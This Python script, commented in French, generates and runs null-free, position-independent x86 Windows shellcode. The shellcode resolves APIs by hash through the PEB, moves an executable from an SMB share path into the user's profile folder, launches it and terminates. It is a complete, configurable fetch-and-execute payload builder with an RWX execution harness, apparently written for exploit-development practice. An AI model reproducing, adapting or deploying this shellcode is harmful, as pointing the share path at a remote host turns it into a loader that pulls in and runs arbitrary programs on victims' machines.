# =============================================================================
#  SHELLCODE - Copie + execution d'un executable depuis un partage SMB
# =============================================================================
#
#  Les chaines, les hashes et les appels sont generes automatiquement a partir
#  de la configuration des variables. Pour adapter le shellcode, il suffit de
#  modifier le bloc CONFIGURATION et la table SYMBOLES.
#
#  Sequence :
#    OpenProcessToken -> GetUserProfileDirectoryA -> lstrcatA -> MoveFileA
#    -> CreateProcessA -> TerminateProcess
#
#  Null-free et position-independent.
# 
#  Detection dynamique de la longueur du nom d'utilisateur : assuree par
#  lstrcatA (ajout au terminateur pose par GetUserProfileDirectoryA). Aucun
#  offset en dur.
#
# L'executable est bougé de son endroit de départ et termine dans C:\Users\XYZ\
# =============================================================================

from keystone import *
import ctypes
import os
import sys


# =============================================================================
#  CONFIGURATION
# =============================================================================

PATH_UNC    = r"\\127.0.0.1\c$\Tools\test.exe"
SUFFIXE     = r"\test.exe"            # Ajoute au profil utilisateur par lstrcatA
DLL_ADVAPI  = "advapi32.dll"          # Exporte OpenProcessToken
DLL_USERENV = "userenv.dll"           # Exporte GetUserProfileDirectoryA

# Table des symboles : nom -> emplacement (offset EBP) ou ranger sa VMA resolue.
# [ebp+0x04] est reserve a &find_function ; les VMA commencent a [ebp+0x08].
SYMBOLES = {
    "LoadLibraryA":             0x08,
    "lstrcatA":                 0x0C,
    "MoveFileA":                0x10,
    "CreateProcessA":           0x14,
    "TerminateProcess":         0x18,
    "OpenProcessToken":         0x1C,
    "GetUserProfileDirectoryA": 0x20,
}

# Emplacements des variables et du buffer (toujours adresses en EBP-relatif).
OFF_LPCCHSIZE = 0x24                  # DWORD : taille du buffer (= 0xFF)
OFF_TOKEN     = 0x28                  # DWORD : handle rempli par OpenProcessToken
OFF_PATHVAR   = 0x110                 # Buffer du chemin a [ebp - 0x110] (0x100 octets)


# =============================================================================
#  HACHAGE (ROR13)
# =============================================================================
def ror32(value, count):
    value &= 0xFFFFFFFF
    return ((value >> count) | (value << (32 - count))) & 0xFFFFFFFF


def custom_hash(name: str) -> int:
    accumulateur = 0
    for index, caractere in enumerate(name):
        accumulateur = (accumulateur + ord(caractere)) & 0xFFFFFFFF
        if index < len(name) - 1:           # Pas de rotation apres le dernier caractere
            accumulateur = ror32(accumulateur, 0x0D)
    return accumulateur


def verifier_hash(name: str) -> int:
    h = custom_hash(name)
    if 0 in h.to_bytes(4, "little"):
        print(f"[!] {name} : le hash {h:#010x} contient un octet NULL "
              f"-> il casserait la propriete null-free !")
    return h


# =============================================================================
#  GENERATEURS D'ASSEMBLEUR (les "helpers")
# =============================================================================
def push_string_asm(text: str) -> str:
    # Genere les instructions qui empilent 'text' (termine par un octet nul) sur
    # la pile, sans aucun null byte dans les opcodes. Apres execution, ESP pointe
    # sur le debut de la chaine. Clobber : EAX.
    data = text.encode("latin-1") + b"\x00"
    while len(data) % 4 != 0:
        data += b"\x00"                       # Padding nul pour aligner sur 4 octets

    dwords = [data[i:i + 4] for i in range(0, len(data), 4)]
    lignes = []
    for chunk in reversed(dwords):            # On empile du dernier au premier
        if 0 not in chunk:                    # Dword 100% ASCII -> push direct
            valeur = int.from_bytes(chunk, "little")
            lignes.append(f"push {valeur:#010x}")
        else:                                 # Dword du terminateur -> a fabriquer
            non_nuls = sum(1 for b in chunk if b != 0)
            if non_nuls == 3:                 # 3 octets utiles + 1 nul en haut
                valeur = int.from_bytes(chunk, "little")
                imm = ((valeur << 8) | 0xFF) & 0xFFFFFFFF
                lignes.append(f"mov eax, {imm:#010x}")
                lignes.append("shr eax, 8")
                lignes.append("push eax")
            else:
                lignes.append("xor eax, eax")
                if non_nuls == 1:
                    lignes.append(f"mov al, {chunk[0]:#x}")
                elif non_nuls == 2:
                    bas = int.from_bytes(chunk[:2], "little")
                    lignes.append(f"mov ax, {bas:#x}")
                lignes.append("push eax")
    return "".join(l + "\n" for l in lignes)


def resoudre_asm(name: str) -> str:
    # Genere : push <hash> ; call find_function ; range la VMA dans le slot.
    h = verifier_hash(name)
    print(f"[*] Hash {name:<24} = {h:#010x}")
    return (f"push {h:#x}\n"
            "call dword ptr [ebp+0x04]\n"
            f"mov [ebp+{SYMBOLES[name]:#x}], eax\n")


def appel_asm(name: str) -> str:
    # Genere l'appel indirect d'une fonction deja resolue.
    return f"call dword ptr [ebp+{SYMBOLES[name]:#x}]\n"


def charger_dll_asm(dllname: str) -> str:
    # Monte le nom de la DLL sur la pile, appelle LoadLibraryA, met la base
    # renvoyee dans EBX (pour que find_function travaille dessus).
    return (push_string_asm(dllname)
            + "push esp\n"
            + appel_asm("LoadLibraryA")
            + "mov ebx, eax\n")


def zeros_asm(nb_dwords: int) -> str:
    # Empile 'nb_dwords' dwords a zero (suppose EAX = 0). Sert a allouer les
    # structures STARTUPINFO / PROCESS_INFORMATION mises a zero.
    return "push eax\n" * nb_dwords


# =============================================================================
#  PLOMBERIE (find_kernel32 + find_function) - identique au template 
# =============================================================================
PLOMBERIE = (
    # --- Prologue ---
    "start:\n"
    # "int3\n"                       # Point d'arret WinDbg
    "mov ebp, esp\n"                 # EBP = point de reference fixe (memory_segment)
    "add esp, 0xfffff0f0\n"          # Reserve ~0xF10 octets de travail, sans null byte

    # --- find_kernel32 : EBX = base de kernel32.dll via le PEB ---
    "find_kernel32:\n"
    "xor ecx, ecx\n"
    "mov esi, fs:[ecx+0x30]\n"       # ESI = PEB
    "mov esi, [esi+0x0C]\n"          # ESI = PEB->Ldr
    "mov esi, [esi+0x1C]\n"          # ESI = InInitializationOrderModuleList
    "next_module:\n"
    "mov ebx, [esi+0x08]\n"          # EBX = base du module courant
    "mov edi, [esi+0x20]\n"          # EDI = nom du module (UNICODE)
    "mov esi, [esi]\n"               # ESI = entree suivante (Flink)
    "cmp [edi+0x18], cx\n"           # Nom de 12 caracteres (kernel32.dll) ?
    "jne next_module\n"

    # --- Recuperation de &find_function sans call vers l'avant (anti-null) ---
    "find_function_shorten:\n"
    "jmp find_function_shorten_bnc\n"
    "find_function_ret:\n"
    "pop esi\n"
    "mov [ebp+0x04], esi\n"          # &find_function pour les appels indirects
    "jmp resolve_symbols\n"
    "find_function_shorten_bnc:\n"
    "call find_function_ret\n"

    # --- find_function : EBX = base DLL ; hash sur la pile -> EAX = VMA ---
    "find_function:\n"
    "pushad\n"
    "mov eax, [ebx+0x3C]\n"
    "mov edi, [ebx+eax+0x78]\n"
    "add edi, ebx\n"
    "mov ecx, [edi+0x18]\n"
    "mov eax, [edi+0x20]\n"
    "add eax, ebx\n"
    "mov [ebp-4], eax\n"
    "find_function_loop:\n"
    "jecxz find_function_finished\n"
    "dec ecx\n"
    "mov eax, [ebp-4]\n"
    "mov esi, [eax+ecx*4]\n"
    "add esi, ebx\n"
    "compute_hash:\n"
    "xor eax, eax\n"
    "cdq\n"
    "cld\n"
    "compute_hash_again:\n"
    "lodsb\n"
    "test al, al\n"
    "jz compute_hash_finished\n"
    "ror edx, 0x0D\n"
    "add edx, eax\n"
    "jmp compute_hash_again\n"
    "compute_hash_finished:\n"
    "find_function_compare:\n"
    "cmp edx, [esp+0x24]\n"
    "jnz find_function_loop\n"
    "mov edx, [edi+0x24]\n"
    "add edx, ebx\n"
    "mov cx, [edx+ecx*2]\n"
    "mov edx, [edi+0x1C]\n"
    "add edx, ebx\n"
    "mov eax, [edx+ecx*4]\n"
    "add eax, ebx\n"
    "mov [esp+0x1C], eax\n"
    "find_function_finished:\n"
    "popad\n"
    "ret\n"
)


# =============================================================================
#  RESOLUTION DES SYMBOLES (genere a partir de la table)
# =============================================================================
RESOLUTION = (
    "resolve_symbols:\n"
    # Fonctions de kernel32 (EBX = kernel32 a ce stade)
    + resoudre_asm("LoadLibraryA")
    + resoudre_asm("lstrcatA")
    + resoudre_asm("MoveFileA")
    + resoudre_asm("CreateProcessA")
    + resoudre_asm("TerminateProcess")
    # advapi32 -> OpenProcessToken
    + charger_dll_asm(DLL_ADVAPI)
    + resoudre_asm("OpenProcessToken")
    # userenv -> GetUserProfileDirectoryA
    + charger_dll_asm(DLL_USERENV)
    + resoudre_asm("GetUserProfileDirectoryA")
)


# =============================================================================
#  SEQUENCE D'ACTIONS
# =============================================================================
ACTIONS = (
    # --- lpcchSize = 0xFF (= 0x100 - 1) ---
    "xor eax, eax\n"
    "mov al, 0xff\n"
    f"mov [ebp+{OFF_LPCCHSIZE:#x}], eax\n"

    # --- OpenProcessToken(-1, TOKEN_QUERY=0x8, &tokenHandle) ---
    f"lea eax, [ebp+{OFF_TOKEN:#x}]\n"   # &tokenHandle
    "push eax\n"
    "push 0x08\n"                        # TOKEN_QUERY
    "push 0xffffffff\n"                  # Processus courant
    + appel_asm("OpenProcessToken")

    # --- GetUserProfileDirectoryA(token, pathVar, &lpcchSize) ---
    + f"lea eax, [ebp+{OFF_LPCCHSIZE:#x}]\n"
    + "push eax\n"
    + f"lea eax, [ebp-{OFF_PATHVAR:#x}]\n"   # pathVar
    + "push eax\n"
    + f"push dword ptr [ebp+{OFF_TOKEN:#x}]\n"
    + appel_asm("GetUserProfileDirectoryA")

    # --- lstrcatA(pathVar, SUFFIXE) ---
    + push_string_asm(SUFFIXE)
    + "mov edi, esp\n"                       # EDI -> SUFFIXE
    + f"lea eax, [ebp-{OFF_PATHVAR:#x}]\n"
    + "push edi\n"                           # lpString2
    + "push eax\n"                           # lpString1 = pathVar
    + appel_asm("lstrcatA")

    # --- MoveFileA(PATH_UNC, pathVar) ---
    + push_string_asm(PATH_UNC)
    + "mov esi, esp\n"                       # ESI -> PATH_UNC
    + f"lea eax, [ebp-{OFF_PATHVAR:#x}]\n"
    + "push eax\n"                           # lpNewFileName = pathVar
    + "push esi\n"                           # lpExistingFileName = PATH_UNC
    + appel_asm("MoveFileA")

    # --- CreateProcessA(pathVar, 0,0,0,0,0,0,0, &infoa, &pinfo) ---
    + "xor eax, eax\n"
    + zeros_asm(4)                           # PROCESS_INFORMATION (16 octets)
    + "mov ebx, esp\n"                       # EBX -> &pinfo
    + zeros_asm(17)                          # STARTUPINFOA (0x44 octets). cb = 0 (comme le
                                             #   pseudo-code C). Si CreateProcessA echoue,
                                             #   mettre le 1er dword a 0x44.
    + "mov ecx, esp\n"                       # ECX -> &infoa
    + "push ebx\n"                           # lpProcessInformation
    + "push ecx\n"                           # lpStartupInfo
    + zeros_asm(7)                           # lpCurrentDirectory..lpCommandLine = 0
    + f"lea eax, [ebp-{OFF_PATHVAR:#x}]\n"
    + "push eax\n"                           # lpApplicationName = pathVar
    + appel_asm("CreateProcessA")

    # --- Sortie propre : TerminateProcess(-1, 0) ---
    + "xor ecx, ecx\n"
    + "push ecx\n"
    + "push 0xffffffff\n"
    + appel_asm("TerminateProcess")
)


CODE = PLOMBERIE + RESOLUTION + ACTIONS


# =============================================================================
#  HARNESS PYTHON
# =============================================================================
if sys.maxsize > 2**32:
    print("[!] Lance ce script avec Python x86 (32-bit)")
    sys.exit(1)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
shellcode = bytes(encoding)

nulls = shellcode.count(0x00)
print(f"[*] {count} instructions assemblees")
print(f"[*] Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
print(f"[*] Null bytes: {nulls}")

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
addr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(addr, shellcode, len(shellcode))
print(f"[*] Shellcode @ 0x{addr:08X}")

# Petit test du chemin source (le shellcode ne signale pas ses echecs) :
# on teste d'abord le dossier (= partage accessible ?), puis le fichier.
dossier = os.path.dirname(PATH_UNC)
if not os.path.isdir(dossier):
    print(f"[!] Dossier introuvable : {dossier}")
elif not os.path.isfile(PATH_UNC):
    print(f"[!] Fichier introuvable : {PATH_UNC}")

input("[*] Attacher WinDbg maintenant (ou pas), puis appuyer sur Entree...")
ctypes.CFUNCTYPE(None)(addr)()
print("[!] Pas termine : TerminateProcess n'a PAS ete appele (probleme).")
